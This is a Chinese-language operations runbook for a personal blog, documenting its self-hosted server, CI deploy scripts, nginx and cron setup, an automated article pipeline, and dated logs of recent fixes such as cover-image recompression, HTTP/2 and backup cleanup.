# 博客维护约定

维护对象：千禧的个人博客 DevLog / My_Blog，域名 `https://blog.qianxi7988.me`，生产服务器 `101.32.163.17`。
仓库：`qianxi-00/My_Blog`，默认分支 `master`。

> **本文件是重建版（2026-10-26）。** 旧版头部停留在 2026-09-28 的 `ci-34` / `index-BB9CPIwO.js` / `ebb9682`，与实际差了近一个月、十几个期次，容易把人带偏。本次按实测重排了章节顺序（期次严格倒序），刷新了「现行生产 / AI 链路 / 源码与仓库 / 数据事实 / 已知缺口 / 验证 / 待办」这些**描述现状**的段落，并补了三十七期。**各期次记录（八期~三十六期）正文原样保留**，它们记的是当时的决策与实测，不必回改。

## 一眼看现状（2026-10-29 15:05 CST 实测）

| 项 | 值 |
|---|---|
| 生产提交 | `4dfb946`（= `origin/master`，服务器 `/data/blog/repo-tmp` HEAD，`HEAD..origin/master` 差 0 提交，工作区干净） |
| 后端镜像 | **`qianxi-blog:ci-53`**（CI run `40300769780`，三十六期分类归一） |
| 容器 | `qianxi-blog`，`Up (healthy)`，`127.0.0.1:8000->7860/tcp`，`--workers 2`，挂载 `-v /data/blog/data:/data` |
| 前端产物 | `assets/index-fRCBNrZy.js`（328,576 B，三十八期重建），详情页 chunk `assets/HotspotDetail-1wEAevNM.js`（36,977 B），桌宠 chunk `assets/DesktopPet-ZaaIhgFW.js`（42,258 B）。**三十九期起部署不再整目录替换**，旧 chunk 按 `KEEP_DAYS=3` 保留。**四十期起 `dist` 只剩 28M**（`live2d` 的 191M 已随 `eaafeda` 从源码移除）。**四十一期起封面图重压**：`dist/uploads/images` 12M→7.3M，nginx 开 HTTP/2 + `/uploads/` 30 天缓存。**同期末清掉 23 张从没被用过的上传图**（`4dfb946`），`dist/uploads/images` 再降到 **2.1M / 29 文件** |
| 内容量 | 文章 **23** 篇（全 published，最新是 2026-04 的老文）；热点 **606** 条（**597 published** + 9 draft） |
| 分类分布 | `AI模型 270 / AI基础设施 158 / AI应用 91 / AI产品 53 / AI安全 25`（三十六期归一后"其他"已归零） |
| 队列 | 宿主 `/data/blog/data/pipeline/hotspot_queue`：pending **0** / failed **0** / archive/published **50** |
| 证书 | `blog.qianxi7988.me` 到 **2026-12-23 07:07 UTC**（certbot 自动续，还有 57 天） |
| 磁盘 / 内存 | `/dev/vda2` 59G 用 **23G（41%）**，可用 34G；内存 3724 MB（可用 2179 MB）；`nproc` = 2。备份与死代码已在四十期清掉：`/data/My_Blog/_backup` **1.2G / 25 条目**（`ci-fe-*` 只剩 3 份，脚本按 `BACKUP_KEEP=3` 自动裁）、`dist` **19M**（无 live2d）、`dist.old-fe-*` 2 份各 219M |

**部署链路一句话**：推 `master` → GitHub Actions（`backend-checks` + `frontend-checks`）→ `deploy` job 按 `git diff` 判定后端/前端 → 后端 `scripts/ci/deploy_backend.sh` 在服务器 build 镜像并切容器；前端在 **runner** 上 build，产物 scp 到服务器后 `scripts/ci/deploy_frontend.sh` 原子替换 nginx 根。**服务器永不跑 npm/node（红线）**。

## 动手前必读的三条

1. **服务器仓库 `/data/blog/repo-tmp` 是唯一权威**，本地克隆不是。本机 GitHub 直连常失败（`Failed to connect to github.com port 443`），所有提交走服务器代推，本地用 `relay` remote 对齐（见「源码与仓库」）。
2. **没有命令输出就不算验证过**。本文件每条线上结论都要能对上当次输出；没打过的接口不要写成"已验证"。
3. **删数据、改生产、推代码：先备份再问。** 密钥只记位置，不写明文。

## 迁移背景与历史红线（2026-09-24）

- **生产已从 HF+Cloudflare Worker 迁到主服务器 `101.32.163.17` 自建**。DNS `blog.qianxi7988.me` A 记录直指 `101.32.163.17`、灰云（不过 Cloudflare 代理）。
- 博客容器、nginx 配置、证书、备份都在主服务器上，见下文「现行生产」。旧栈（HF Space + Worker）保留作回退，仍可经 `qianxi-blog-site.1964055097.workers.dev` 访问。
- **绝不在主服务器上跑前端构建**（npm/vite 会把 3.6G 内存的机器打挂，2026-09-24 已实测 OOM 一次）。**2026-10-08 八期起构建已彻底移到 GitHub runner**：runner 出 `frontend/dist` → artifact → scp → 服务器只解包替换。早期"本地构建 + 分批上传"的做法已废弃。
- **绝不往 HF Space 推代码**：免费层 `/data` 不持久，每次重建都会用 `data/db_part_*.dat` 重置线上库（2026-09-24 实测确认，view_count 从 13 回落 10）。
- `README.md` / `DEPLOY.md` 里的 Nginx+MySQL+Redis 是旧方案；`API_INVENTORY.md` 是 2026-03-19 的旧扫描。现行合同看线上 OpenAPI。
- 本机 Windows + pwsh；可用 Python 只有 `F:\ProGramApp\Anaconda\python.exe`。远程 Linux 用 bash。`F:\ProGram\DSH_Temporary` 会被清，成果不放那里。
- 动手前说明打算、原因、影响，确认后再执行。删数据、改生产、推代码：先备份再问。没有接口输出不说完成。密钥只记位置不写明文。

## 现行生产（2026-10-26 实测）

```
用户 → https://blog.qianxi7988.me （DNS 灰云直连 101.32.163.17）
        └─ nginx
            ├─ /api/        → 127.0.0.1:8000 → docker 容器 qianxi-blog (uvicorn :7860)
            ├─ /uploads/    → 静态文件 /var/www/blog/dist/uploads（try_files，不转后端）
            └─ 其它         → /var/www/blog/dist（React 构建产物，SPA fallback）
```

| 组件 | 位置 / 事实 |
|---|---|
| 后端容器 | `qianxi-blog`，镜像 **`qianxi-blog:ci-53`**（CI 自动打 tag `ci-<run_number>`）。构建源 = CI 里 `git archive HEAD backend` 导出树，不是本地工作区。`--memory 1g --cpus 2`，uvicorn **`--workers 2 --proxy-headers --forwarded-allow-ips='*'`**（GIL 决定单进程最多 1 核；**proxy-headers 不能漏，限流靠它拿真实访客 IP**）。`--restart unless-stopped`，`blog-net`，只绑 `127.0.0.1:8000`。手动回滚：`bash /data/blog/rollback.sh <镜像tag>`（只换镜像、不碰数据库） |
| 部署脚本 | `scripts/ci/deploy_backend.sh`（5 步：build → 镜像自检 `build_all_tools('super_admin')` 工具数 >50 → 切容器 → health 轮询 90s → 公网冒烟；任一步失败自动回滚到 prev 容器）。`scripts/ci/deploy_frontend.sh`（4 步：解包 → 结构校验三关 → 原子替换 dist → 公网验 chunk；失败回滚）。两者都保留最近 2 份备份 |
| 并发优化（2026-09-24 实测） | SQLite 已切 **WAL**（`app/core/database.py` 连接事件监听自动 PRAGMA：journal_mode=WAL + synchronous=NORMAL + busy_timeout=5000）；aiosqlite 方言默认 NullPool，已显式 `AsyncAdaptedQueuePool`（pool_size=20/max_overflow=30）；bcrypt 登录验证改 `asyncio.to_thread`；A-RAG SSE 有并发护栏 `asyncio.Semaphore(8)`/worker。压测（ab，同机 2 核）：1worker/1CPU=42.7rps/750ms → 2worker/2CPU=70.6rps/453ms（直连）、62.6rps/0 错误（公网 HTTPS 全路径）。剩余上限是宿主机 2 核本身 |
| A-RAG 聊天 | 公开问答是 **LangChain create_agent**（2026-09-24）。端点 `POST /api/v1/chat/message/agentic`（SSE，事件 `reasoning`/`tool_start`/`tool_result`/`text`/`done`/`error`）。实现 `backend/app/services/arag_agent.py`（5 个检索工具：文章/证据块/读窗口/读全文/热点；工具**各自开独立 DB 会话**，因为 ToolNode 并行调用）。`ReasoningChatOpenAI` 子类把网关 `delta.reasoning_content` 透传进 SSE。旧端点 `/chat/message/stream`（Poro 伪流式）保留给桌宠主动气泡。**nginx `/api/` 的 `proxy_buffering off` 是 SSE 依赖，别删** |
| 数据库 | 容器挂载宿主机 `/data/blog/data` → 容器 `/data`；库 = 容器内 **`/data/blog.db`** = 宿主 `/data/blog/data/blog.db`（WAL，27.7 MB，30 张表）。2026-09-24 从 HF 导出；此后内容一直在长（现 23 文 / 605 热点） |
| 前端 | `/var/www/blog/dist`（`du` = 219 MB，属主 `www-data`）。当前主 chunk `assets/index-BsLrrdIV.js`（328,584 B）；路由级 lazy，98 个 chunk 按需加载。**前端内容目录 `uploads/ data/ .well-known/ live2d/` 在每次 CI 部署时从旧 dist 复制保留**（`deploy_frontend.sh` 里写死这四个名字） |
| nginx | `/etc/nginx/sites-available/blog`（独立文件，别动 `new-api` 那份）。80 端口有 `^~ /.well-known/acme-challenge/` 例外 + 301，**别删这个例外，删了证书续不了**。⚠️ **`/api/` 的 `proxy_set_header X-Forwarded-For` 必须是 `$remote_addr`（覆写），不能是 `$proxy_add_x_forwarded_for`（追加）**——否则客户端自带 XFF 头即可伪造来源 IP 绕过限流。**二十九期的缓存策略见该节**：`location /` 全量 no-store、`^~ /assets/` 长缓存 + `try_files $uri =404`（**别退回 `location = /index.html`，对根请求不生效，实测踩过**） |
| 证书 | Let's Encrypt `blog.qianxi7988.me`，到期 **2026-12-23 07:07 UTC**，certbot 自动续期（webroot=`/var/www/blog/dist`）。同机还有 `cpa`（12-15）、`magpie`（2027-01-24）、`qianxi7988.me`+`api`（12-05） |
| 运行配置 | `/data/blog/runtime.env`（600 root-only）。键：`OPENAI_API_KEY/BASE/MODEL/MODEL_FALLBACKS`、`ZHAIYAO_MODEL`、`AGENT_*`、`LLM_MODEL_CHAIN`、`JWT_SECRET_KEY`、`REDIS_ENABLED=false`、`SITE_URL`、`SMTP_*`（8 个）、以及十期加的 `PIPELINE_API_KEY / PIPELINE_API_BASE / PIPELINE_MODEL / PIPELINE_CRON_KEY`。**部署时 runtime.env 与容器现有 env 做增量合并**（容器已有的键以容器现值为准，只有新键才补进去） |
| 备份 | `/data/blog/backup-db.sh`，cron 每天 04:30 热备份到 `/data/blog/backups/`（DB + nginx/cron/runtime.env 快照 + 源码变化时重打包），保留 14 天 |
| AI 日报 | `/data/blog/scripts/fetch_ai_daily.py` + `/etc/cron.d/blog-ai-daily`：每 30 分钟拉 **`aihot.news` /api/v1**（2026-10-08 自旧接口迁移），直写 `/var/www/blog/dist/data/`。ETag 状态 `/data/blog/logs/ai-daily-state.json`。日志 `/data/blog/logs/ai-daily-fetch.log` |
| 提示词同步 | `/data/blog/scripts/sync_coze_prompts.py` + `/etc/cron.d/blog-coze-sync`：每天 05:10 拉扣子机器人人设 → 投稿接口入库 `pending`，后台审核后上架。PAT 在 `/data/blog/coze.env`（600，**最长 30 天过期**，过期日志记 401）。状态 `/data/blog/coze-sync-state.json`，日志 `/data/blog/logs/coze-prompt-sync.log` |
| AI 网络桥 | docker 网络 `blog-net`：`qianxi-blog` 与 `new-api` 都挂着。**拆掉这个网络 AI 就断**（new-api 只发布在宿主 `127.0.0.1:3001`）。**2026-09-28 起持久化**：`/data/new-api-stack/docker-compose.yml` 的 `new-api` 服务声明 `networks: [default, blog-net]` + 顶层 `networks: blog-net: external: true`，`docker compose up -d` 不会再丢 |
| 热点流水线 | 见下节「热点文章流水线」 |
| cron | 见下节「定时任务」 |

## 热点文章流水线（2026-10-26 实测）

整个博客的日常内容主要靠这条流水线产出：自动选题 → 检索论文 → 写 8~9 章节长文 → 结构闸 → 审稿闸 → 入队 → 发布。

### 两套图（`use_harness` 开关）

`backend/app/services/hotspot_pipeline/harness.py`（**二十三期起默认走这套**）：

```
START → _route_entry → {check(回炉模式), plan}
plan → sections → assemble → check
         ↑______________________|
rework_fix → check          （无规划时的整篇修）
retry → plan                （回炉重写）
failed → END
enqueue → _route_after_enqueue → {publish, END}
publish → END
```

`backend/app/services/hotspot_pipeline/graph.py` 老流水线（`use_harness=false` 时用）：

```
START → _route_entry → {pick_topic, check_mermaid}
pick_topic → research → write → check_mermaid
retry → pick_topic ; failed → END ; enqueue → {publish, END} ; publish → END
```

### 关键常量（`graph.py`）

| 常量 | 值 | 含义 |
|---|---|---|
| `MIN_BODY_CHARS` | **4500** | 硬底，低于此线一律打回（二十五期定的，千禧要求的最低长度） |
| `DEFAULT_TARGET_CHARS` | 6000 | 规划层没给目标时的兜底锚点 |
| `MAX_TITLE_CHARS` | 32 | 标题上限（二十二期） |
| `MAX_STRUCTURE_ROUNDS` | 4 | 结构闸最多回炉次数 |
| `MAX_REVISION_ROUNDS` | 2 | 审稿内容性修订次数 |
| `MAX_REVIEW_STRIKES` | **3** | 三十一期加：审稿服务连续空响应多少次后判 failed |
| `MIN_REVIEW_SCORE` | **85** | 审稿分数门槛（二十期） |
| `MAX_RESEARCH_TOOL_CALLS` | 10 | 检索阶段工具调用预算 |
| `MAX_RETRY` | 1 | 老流水线重试次数 |
| `QUEUE_ROOT` | `/data/pipeline/hotspot_queue` | **容器内路径**，宿主实际是 `/data/blog/data/pipeline/hotspot_queue`（见下方"队列路径"） |

### 模型

写作/规划/审稿**全部走 stepfun**：`PIPELINE_API_BASE=https://api.stepfun.com/step_plan/v1`、`PIPELINE_MODEL=step-5-preview`、`PIPELINE_API_KEY`。`graph.py:137` 有硬检查——**`PIPELINE_API_KEY` 没配就拒绝静默 fallback 到 `OPENAI_API_KEY`**。stepfun 硬并发上限 5，所以 `MAX_CONCURRENT_SECTIONS = 2`。

### 队列路径（容易查错的地方）

容器只挂了一个卷：`-v /data/blog/data:/data`。所以容器里的 `/data/pipeline` **等于宿主 `/data/blog/data/pipeline`**。

⚠️ **宿主 `/data/pipeline` 是另一个无关目录**（只有 `hotspot_queue/archive/pub-cleanup-20261014-135947` 之类空壳），之前误查过它。要看真实队列，去 `/data/blog/data/pipeline/`：

```
/data/blog/data/pipeline/
├── hotspot_queue/{pending, failed, archive/published}
├── figures/{blog/images, _done, _pending, _failed}
├── backup/
└── dryrun_draft.md / dryrun.log / dryrun_result.json
```

发布成功后 `publish()` 会调 `_archive_published_queue_files(slug)` 把 `pending/{slug}.md` + `.meta.json` 移到 `archive/published/`（三十二期加，包在独立 `try/except` 里，归档失败不影响发布）。

### 触发方式

```bash
# cron 用的 wrapper（key 现读 runtime.env）
/data/blog/scripts/trigger_hotspot_pipeline.sh <mode> <track_slot> <publish> [use_harness]
#   mode = hot | curriculum
#   publish = true | false
#   use_harness = 1 | 0

# 直接打接口
POST /api/v1/hotspot-pipeline/cron    header: x-cron-key
  body: {"mode":"hot","track_slot":"1900","publish":true,"use_harness":true,
         "rework_file":"/data/pipeline/hotspot_queue/pending/xxx.md"}   # rework_file 走回炉入口
```

其他接口：`POST /run`（同参数，需管理员）、`GET /runs`（需 `get_super_admin`，看历史 run）。

### 文件锁

`/data/pipeline/.run.lock`（宿主 `/data/blog/data/pipeline/.run.lock`），内容 = `pid iso时间戳`。

**`LOCK_STALE_SECONDS = 3 * 3600`**（`backend/app/api/v1/hotspot_pipeline.py:49`）。三十五期从 1800 改上来——因为单次实测耗时 1h02m~2h25m，30 分钟阈值会让第 30 分钟的下一次 cron 把锁当"死锁残留"删掉、启动第二个任务并发。锁被占用时打 `[hotspot-pipeline] 已有流水线在跑（文件锁），本次触发放弃...` 而不是只抛 409（否则 cron 日志里只有 "Client error 409"，分不清是"在跑"还是"出故障"）。

### 单次耗时与实测产出

- 实测 1h02m ~ 2h25m（10-21 手动 1h52m、10-21 19:20 cron 2h25m、10-22 09:20 cron 1h02m）。
- 典型产出：**7000~8700 中文字、1~4 张图、23~29 张表、8 个 mermaid、9 个章节（含结论节）、2 条来源**。
- 三十四期之后，hot 模式的检索词已做过滤（机构/产品/硬件/发布词/泛词 + 模型名版本后缀剥离，全滤光兜底 `"large language model"`），因为 hot 模式的 `topic_hint` 来自 AIHOT 资讯标题，混着 `Google Research`、`NVIDIA Blackwell GPU` 这类词。

## 定时任务（`/etc/cron.d/`，宿主时区 CST +0800）

| 文件 | 时间 | 内容 |
|---|---|---|
| `hotspot-pipeline` | **19:20 / 23:20 / 03:20** + `*/2` | 3 次发布任务（全部落在夜间窗口，三十五期改）+ 每 2 分钟 `push_figures_watch.sh` 推论文原图到图床 |
| `blog-ai-daily` | `*/30` | `fetch_ai_daily.py`，拉 AIHOT 日报写静态 JSON，**不写库、不发文章** |
| `hotspot-tagging` | `17 3` | `docker exec qianxi-blog python3 /data/tag_hotspots.py`，只补 `topic_tag` |
| `blog-backup` | `30 4` | `backup-db.sh` |
| `blog-coze-sync` | `10 5` | `sync_coze_prompts.py` |
| `certbot` / `e2scrub_all` / `sysstat` / `sgagenttask` / `yunjing` | — | 系统自带 |

`hotspot-pipeline` 的三行实际是：

```cron
20 19 * * * root /data/blog/scripts/trigger_hotspot_pipeline.sh hot hot true 1
20 23 * * * root /data/blog/scripts/trigger_hotspot_pipeline.sh curriculum 1900 true 1
20 3  * * * root /data/blog/scripts/trigger_hotspot_pipeline.sh curriculum 2000 true 1
*/2  * * * * root /data/blog/scripts/push_figures_watch.sh
```

⚠️ **这份 cron 不在 git 里**，改完记得同步到仓库 `ops/cron/hotspot-pipeline`（三十五期留档）。另注意：`/etc/cron.d/` 里**文件名不能带点号**（cron 会忽略，如 `xxx.bak-20261022` 实测未被执行）。

## 四十一期：封面图渲染不出来——重压封面 + nginx 缓存头 + HTTP/2（2026-10-29，提交 `68b6fcb`）

千禧报障（附截图）："有些文章的封面图渲染不出来了"——`/articles` 列表页右侧封面列显示破图 + alt 文字，
`xGen-MM (BLIP-3) 的深度拆解`、`BLIP-2 (...)`、`BEiT-3 多模态"大一统"架构`、`多模态之CoCa—对比+字幕生成` 四篇。

### 先排除掉的：不是文件缺失，也不是服务端

- 23 篇文章的 `cover_image` **全部存在**，`/var/www/blog/dist/uploads/images/` 逐个校验 **23/23，缺失 0**；
  公网 `curl` 全 200，`Content-Length` 与磁盘一致。
- nginx access.log 里**没有任何 `/uploads/images/*.jpg` 的 404**（只有 `/uploads/.env`、`/wp-content/...` 这类扫描器 404）。
- 服务器本地 `curl` 同一张图 **0.04s**。

### 真正的分界线：文件体积

同一次访问（IP `103.62.49.162`，`29/Oct 14:10:02`）的 nginx 日志：

| 结果 | 字节数 |
|---|---|
| 成功加载 6 张 | `43498 / 53668 / 49423 / 99470 / 91381 / 199661` |
| 截图里失败 5 张 | `326011 / 327181 / 290911 / 354851 / 243423` |

**成功全部 ≤200KB，失败全部 ≥243KB**，分界干净。本机复现：326KB 那张连测三轮 =
**5.06s / 8.35s / 第三轮 60 秒只传完 130,819 / 326,011 字节就断**。

这和三十八期是同一个病：**公网链路间歇丢包 + TCP 重传退避耗尽**（`1+2+4+8+16+32`），字节越多越容易断。
三十八期已证伪 MTU 假设，这次不再重复排查。

### 三个放大因素

1. **图太大**：封面全是 **1600px 宽**（列表只显示 250~400px），23 张合计 **11.2 MB**，
   最大 `e3f584da7d694264ae4deb11bb8e59cc.jpg` **905,009 B（1600×2132）**。
2. **`/uploads/` 没有缓存头**：原来只有 `Last-Modified`，**没有 `Cache-Control` / `Expires`**
   → 浏览器不持久缓存，每次回访都重下。
3. **站点是 HTTP/1.1**：`listen 443 ssl;` 没开 http2，6 张图各占一条连接排队。

### 改动（千禧选"三项全做"）

**1) 重压 23 张封面**（`frontend/public/uploads/images/`，提交 `68b6fcb`）

策略：目标 **≤100KB**，优先降尺寸（`WIDTHS = [800, 720, 640]`）、其次降质量
（`QUALITIES = [82, 78, 74, 70, 68]`），`Image.LANCZOS` + `optimize=True, progressive=True`。

结果 **6.1 MB → 1.7 MB（缩小 3.6×）**，22/23 张 ≤100KB。典型：

| 文件 | 原 | 新 | 缩小 |
|---|---|---|---|
| `f90d470f…jpg` | 326,011 | 94,259 | 3.5× |
| `d560f1b1…jpg` | 243,423 | 55,958 | 4.4× |
| `975d2ae4…jpg` | 567,236 | 97,303 | 5.8× |
| `e3f584da…jpg` | 905,009 | 126,953 | **7.1×**（640×853 q68，唯一仍超 100KB 的） |

原图备份 `/data/My_Blog/_backup/covers-orig-20261029-142435`（47 文件 12M）。

**为什么可以直接压原图**：`cover_image` 只在 3 个卡片位置用——`frontend/pages/ArticleList.tsx:258`、
`frontend/pages/AuthorPage.tsx:131`、`frontend/pages/Home.tsx:142`；**详情页不渲染封面**。
所以压小原图不影响任何大图展示。

**2) `/uploads/` 加 30 天缓存**（`/etc/nginx/sites-available/blog`）

```nginx
location /uploads/ {
    expires 30d;          # 同时写 Expires 和 Cache-Control: max-age=2592000
    try_files $uri =404;
}
```

只用 `expires` 不再额外 `add_header Cache-Control`，避免像 `/assets/` 那样出现两个 `Cache-Control` 头。

**3) 开 HTTP/2**

`listen 443 ssl;` → `listen 443 ssl http2;`

⚠️ **nginx 1.24.0 只认 `listen ... http2` 这种写法**。`http2 on;` 指令是 1.25.1 才加的，
在 1.24 上写了会 `unknown directive`。

### 验证（全部有输出）

- `nginx -t` 通过；`systemctl reload nginx` 后 `active`。
- HTTP/2 协商成功：服务器侧 `curl -sI --http2 -k https://127.0.0.1/ -H "Host: blog.qianxi7988.me"` → `HTTP/2 200`。
- 缓存头生效：`/uploads/images/f90d470f….jpg` → `expires: Sat, 28 Nov 2026 06:26:36 GMT`
  + `cache-control: max-age=2592000`。
- 公网：`/` 200（0.046s）、两张封面 200（94,259 B / 126,953 B，0.045s / 0.040s）、
  `/api/v1/articles` 200 —— `http_version` 全部 = **2**。
- 本机（丢包链路）复测：`f90d470f` 三轮 14.2s 完成 / 70s 截断在 32,444 B / 5.9s 完成；
  `5fe617ee` 9.5s、16.0s 均完成。

### 诚实记录

- **本机链路仍会偶尔截断**（5 次里 1 次）。服务器侧 0.04s、出口空闲、网卡零丢包，问题在公网，
  我修不了。能做的只是把字节数降下来 + 加缓存 + 上 HTTP/2。
- 缓存头对**首次访问**无效（浏览器本来就没有副本），主要收益是回访和列表页滚动时不再重下。
- `dist/uploads/images` 有 52 个文件，仓库 `frontend/public/uploads/images` 只有 47 个——差的 5 个是
  热点文章的内联图（`.svg` / `.png`），没进 git。已核：**没有任何 >200KB 的图被正文引用**。

### 顺带清理：23 张从没被用过的上传图（`4dfb946`，CI run #60）

千禧说"清了吧"。第一轮我报的是"12 张孤儿图"，**那个结论是错的**——扫描范围不全。
正确的排查走了四轮，教训值得记下来：

| 轮次 | 扫描范围 | 结论 | 错在哪 |
|---|---|---|---|
| 1 | `articles.content_md` + `hot_topics.analysis_md` | 12 张孤儿 | 漏了 `cover_image` 列和别的表 |
| 2 | 全库所有 TEXT 列 | 0 张孤儿 | 把 `article_images` 也算进去了——那是**上传日志**，每张图都有一条记录，拿它当引用依据等于循环论证 |
| 3 | 去掉 `article_images`，但仍漏 `articles.cover_image` | 46 张孤儿 | 23 张封面全被误判 |
| 4 | 见下 | **被引用 29 / 未被引用 23** | ✅ |

第四轮扫的列：`articles` 的 `cover_image` / `content_md` / `content_html` / `summary` / `ai_intro`，
`hot_topics` 的 `analysis_md` / `summary` / `key_points_json` / `title`，
`prompts.content`、`forum_posts.content`、`comments.content`、`chat_messages.content`、
`site_settings.value`。

那 23 张是 2026-01 往媒体库传的测试图（`default (1).jpeg`、`qianxi.jpg`、`weibo1.jpeg`、
`cover.jpg` 之类），`article_images.article_id` **全部为 NULL**，合计 **5.07 MB**。

**动的手**（都带备份）：
1. 文件备份 `/data/My_Blog/_backup/orphan-images-20261029-150041`（23 文件 5.2M）
2. 数据库备份 `/data/blog/data/blog.db.bak-img-20261029-150041`（`sqlite3 .backup`）
3. 删 `article_images` 对应 23 行（47 → 24）——不删的话后台媒体库会留 23 个指向已删文件的空条目
4. `git rm` 那 23 个文件（`--cached` 只删索引，还得 `rm -f` 删工作树）
5. 从 `dist/uploads/images/` 删掉

**结果**：`dist/uploads/images` 12M → **2.1M**（52 → **29 文件**）、仓库源 7.0M → **1.8M**（47 → **24 文件**）、
`dist` 总 24M → **19M**、磁盘 24G/42% → **23G/41%**。

**验证**：被删的图 404、保留的图 200（h2）、`/` 与 `/articles` 200、`/health` healthy、
API 拉 23 篇文章逐张 curl 封面**全部 200**。

### 仍未做（用户未要求）

- 老文章内联图同样有 1600px 的问题，只是详情页不是首屏，用户没报。
  `self-play-alignment-paradigms.png` 136,817 B 是里面最大的一张。

## 四十期：裁掉 4.3G 备份 + 移除 191M 的 Live2D 死资源（2026-10-29，提交 `eaafeda`，前端-only）

千禧对三十九期遗留的两个问题都拍了板（`ask_user_question`）：
「`_backup/ci-fe-*` 裁到 3 份」选**现在就裁**，「`dist/live2d` 191M 死代码」选**直接删**。

### 动手前的核实——推翻了文档里的一个错误结论

「已知缺口」第 1 条原本写的是 **"`frontend/public/live2d/` 目录存在但为空"**。实际不是：

| 项 | 实测 |
|---|---|
| `frontend/public/live2d` | **220 个文件、191M**（`models/` 占绝大部分） |
| 是否被 git 跟踪 | **是，220 个文件全部在版本控制里**（`git ls-files \| wc -l` = 220） |
| 代码引用 | `grep -ril live2d frontend/ --include=*.ts --include=*.tsx` → **零命中**（只命中 `package.json` 的依赖名和资源自带的 `waifu-tips.json`） |
| 线上请求 | `grep -c live2d /var/log/nginx/access.log{,.1}` → **0 / 0**，2026-09-24 迁移至今一次都没被请求过 |
| `vite.config.*` | **没有** `publicDir`/`outDir` 覆盖 → Vite 默认 `publicDir: 'public'` |

最后一行是关键：**只要 `public/live2d` 还在，每次 CI 构建都会把它原样复制进 `dist`**。
所以只 `rm -rf dist/live2d` 是白删的——下次部署就回来了。必须连 git 里的源一起删。

### 做了什么

1. **裁备份**：`cd /data/My_Blog/_backup && ls -d ci-fe-* | sort | head -n -3 | xargs -r rm -rf`
   → 删 21 份（`ci-fe-20261008-175156` … `ci-fe-20261026-175654`），留最近 3 份。
   `_backup` **5.5G → 1.2G**。
2. **删 dist 里的死资源**：`rm -rf /var/www/blog/dist/live2d` → `dist` **219M → 28M**。
3. **删 git 里的源**（这一步才是持久的）：`git rm -r -q frontend/public/live2d`
   → **220 files changed, 2279510 deletions(-)**，`frontend/public` 从 212M → 21M。
   没另做磁盘备份——**git 历史仍保留这些 blob**，需要时
   `git checkout <commit> -- frontend/public/live2d` 能完整恢复。

### 结果

| 项 | 前 | 后 |
|---|---|---|
| `/data/My_Blog/_backup` | 5.5G / 46 条目（`ci-fe-*` 24 份） | **1.2G / 25 条目（`ci-fe-*` 3 份）** |
| `/var/www/blog/dist` | 219M（`live2d` 191M） | **28M**（`uploads 12M / images 7.7M / assets 7.1M / data 1.4M`） |
| `frontend/public` | 212M | **21M** |
| 磁盘 `/dev/vda2` | 29G 用 / 51% | **24G 用 / 42%**，可用 33G |

### CI run #58 是新部署脚本的第一次真实运行

`eaafeda` 只动 `frontend/`，`deploy` job 里 `DO_FRONTEND=true`，于是三十九期的新脚本
在生产里跑了第一遍。观察到的三件事都对：

- `dist` 稳定在 **28M，无 `live2d`** —— 说明源删干净后构建产物也干净了。
- `_backup/ci-fe-*` 仍是 **3 份**（新增 `ci-fe-20261029-133913`，最老的一份被脚本自己裁掉）
  —— **`BACKUP_KEEP=3` 在真实 CI 里生效**，不需要人工干预。
- `dist.old-fe-*` 仍是 2 份（脚本原有的保留逻辑未变）。

**一个容易被误判成 bug 的现象**：部署后 `index.html` 的主 chunk 还是
`/assets/index-fRCBNrZy.js`，跟部署前一模一样。这是**正确的**——删 `public/` 下的
静态资源不改变任何 JS bundle 的内容，Vite 的内容哈希自然不变。不要因为
"chunk 没换"就以为部署没生效，要看 `dist` 体积和 `live2d` 是否还在。

### 部署后验证（全部有输出）

- 公网：`/` 200 (0.042s)、`/assets/index-fRCBNrZy.js` 200、`/api/v1/articles` 200、
  `/api/v1/hotspots?status=published` 200、`/api/v1/settings/public` 200。
- SPA 深链：`/archives` `/hotspots` `/prompts` `/articles` 全 200。
- `dist/assets` **163 文件**，从所有 `.js` + `index.html` 提取被引用 chunk
  **101 个，缺失 0**。
- 容器 `qianxi-blog:ci-53 Up 2 days (healthy)`；内部 `/health` = `{"status":"healthy"}`。

### 遗留

- 另有 **22 个非 `ci-fe-*` 的历史备份目录**（`bubble-*` / `manual-*` / `r3-rescue-*` /
  `skills-*`）不在脚本裁剪范围内，体积很小，未清。
- 仓库 `.git` 仍是 **172M**——`git rm` 只删工作树和索引，历史 blob 还在。要真正瘦身
  得 `git filter-repo` 改写历史 + 强推，**风险大且会影响所有克隆，没做**。

## 三十九期：部署脚本保留旧 chunk + 备份目录裁剪（2026-10-29，提交 `81df270`，只改 `scripts/ci/deploy_frontend.sh`）

千禧批准三十八期收尾时提的建议（原话："可以,按照你的建议去做"）：把 `deploy_frontend.sh` 从
「整目录替换」改成「合并新产物 + 保留旧 chunk 几天 + 定期裁剪」。

### 要解决的两个问题——都是"部署动作自己制造的故障"

**1) 整目录替换会让还开着的标签页 404**

老流程是 `mv dist dist.old-fe-<TS>` → `mv new dist`：本次构建没产出的 chunk **全部消失**。
已经打开的标签页在下次切路由时 `import()` 拿 404 → 冒到唯一的 `ErrorBoundary` → 整页
「页面出错了」。三十八期那次故障（`DesktopPet-BvlulqHy.js`）真凶是公网丢包，但**同一条错误
信息也完全可以由部署本身产生**——这是同类故障里唯一能靠代码根治的一条。

**2) `_backup/ci-fe-*` 是无限增长的磁盘泄漏**

脚本每次部署 `cp -a "$LIVE"/. "/data/My_Blog/_backup/ci-fe-$TS"/` 做一份 219M 全量副本，
**从来没有清理过**。实测积到 **46 份 / 5.5G**（其中 `ci-fe-*` 24 份各 219M），而
`dist.old-fe-*` 另有两份各 219M——一次部署往盘上写 438M。磁盘总共 59G，用了 29G。

### 改动（69 行 → 138 行）

新增三个可覆盖的旋钮：

| 变量 | 默认 | 含义 |
|---|---|---|
| `KEEP_DAYS` | 3 | 旧 chunk 最多在 `dist` 里留几天 |
| `ASSETS_CAP_MB` | 64 | `dist/assets` 体积上限，超了从最老的旧 chunk 删起 |
| `BACKUP_KEEP` | 3 | `_backup/ci-fe-*` 保留份数 |

流程从 4 步变 5 步，**第 2 步里多了"携带旧 chunk"**：

1. 解包 + 结构校验三关（不变）
2. 组装新 dist：保留内容目录（不变）+ **把 `$LIVE/assets` 里「新包没有、且 `-mtime -KEEP_DAYS`
   以内」的文件 `cp -a` 进新包**；再按 `ASSETS_CAP_MB` 兜体积上限（从最老的携带文件删起，
   `$T/fresh-assets.txt` 里本次构建自带的文件**永不删**）
3. 原子替换（不变）
4. 验证（不变）+ **抽查一个携带过来的旧 chunk 是否 200**（抽查失败只告警，不阻断发布）
